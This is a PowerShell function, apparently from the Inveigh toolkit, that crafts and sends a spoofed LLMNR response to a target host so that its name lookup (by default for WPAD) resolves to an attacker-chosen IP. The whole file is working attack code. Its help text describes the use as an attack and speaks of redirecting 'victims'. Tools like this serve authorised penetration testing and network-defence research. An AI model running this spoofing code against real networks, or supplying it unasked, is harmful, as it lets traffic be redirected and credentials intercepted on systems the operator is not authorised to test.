
function Send-LLMNRResponse
{
<#
.SYNOPSIS
Send-LLMNRResponse sends a crafted LLMNR response packet to a specific target. For name resolution to be successful,
the specified TargetIP, TargetPort, Hostname, and TransactionID must match a very (very very) recent LLMNR request.
You must have an external method (wireshark,etc) of viewing the required LLMNR request fields for traffic on the
target subnet. The odds of pulling this attack off manually are slim if not impossible due to the narrow response
window. Ideally, this function would be fed by another script.

.PARAMETER Hostname
Default = WPAD: Specify a hostname for NBNS spoofing.

.PARAMETER LLMNRTTL
Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.

.PARAMETER SendPort
Default = Random Available: Specify a source port for the LLMNR response. Note that the standard port is 5355
which will cause a binding conflict if LLMNR is enabled on the host system. A random port seems to work fine.

.PARAMETER SpooferIP
Specify an IP address for NBNS spoofing. This parameter is only necessary when redirecting victims to a system
other than the function host. 

.PARAMETER TargetIP
Specify an IP address to target for the LLMNR response.

.PARAMETER TargetPort
Specify an port to target for the LLMNR response. This port must match the source port included in the request.

.EXAMPLE
Send-LLMNRResponse -Target 192.168.1.11 -Hostname test -TransactionID 9c9e

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>


[CmdletBinding()]
param
(
[parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP="",
[parameter(Mandatory=$true)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$TargetIP="",
[parameter(Mandatory=$true)][ValidatePattern('^[A-Fa-f0-9]{4}$')][String]$TransactionID="",
[parameter(Mandatory=$true)][String]$Hostname = "",
[parameter(Mandatory=$true)][Int]$TargetPort="",
[parameter(Mandatory=$false)][Int]$SendPort="0",
[parameter(Mandatory=$false)][Int]$LLMNRTTL="30",
[parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(!$SpooferIP)
{ 
    $SpooferIP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
}

$hostname_bytes = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
$LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
[Array]::Reverse($LLMNR_TTL_bytes)
$Transaction_ID_encoded = $TransactionID.Insert(2,'-')
$Transaction_ID_bytes = $Transaction_ID_encoded.Split('-') | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

$LLMNR_response_packet = $Transaction_ID_bytes +
                                 0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                 $hostname_bytes.Count +
                                 $hostname_bytes +
                                 0x00,0x00,0x01,0x00,0x01 +
                                 $hostname_bytes.Count +
                                 $hostname_bytes +
                                 0x00,0x00,0x01,0x00,0x01 +
                                 $LLMNR_TTL_bytes +
                                 0x00,0x04 +
                                 ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

$send_socket = New-Object System.Net.Sockets.UdpClient($SendPort)
$destination_IP = [System.Net.IPAddress]::Parse($TargetIP)
$destination_point = New-Object Net.IPEndpoint($destination_IP,$TargetPort)
$send_socket.Connect($destination_point)
$send_socket.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
$send_socket.Close()
}